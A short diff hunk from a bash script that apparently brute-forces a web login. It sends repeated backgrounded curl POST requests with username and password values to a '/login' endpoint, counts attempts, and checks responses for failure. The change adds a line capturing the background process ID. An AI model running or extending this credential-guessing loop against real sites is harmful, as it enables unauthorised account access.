@@ -97,6 +97,7 @@ begin(){
 
 		curl -s -X Post "$url/login" -d "username=$user&password=$pass" &
 
+		pid=$!
 		((attempts++))
 
 		if [[ "$response" == *fail* ]]; then
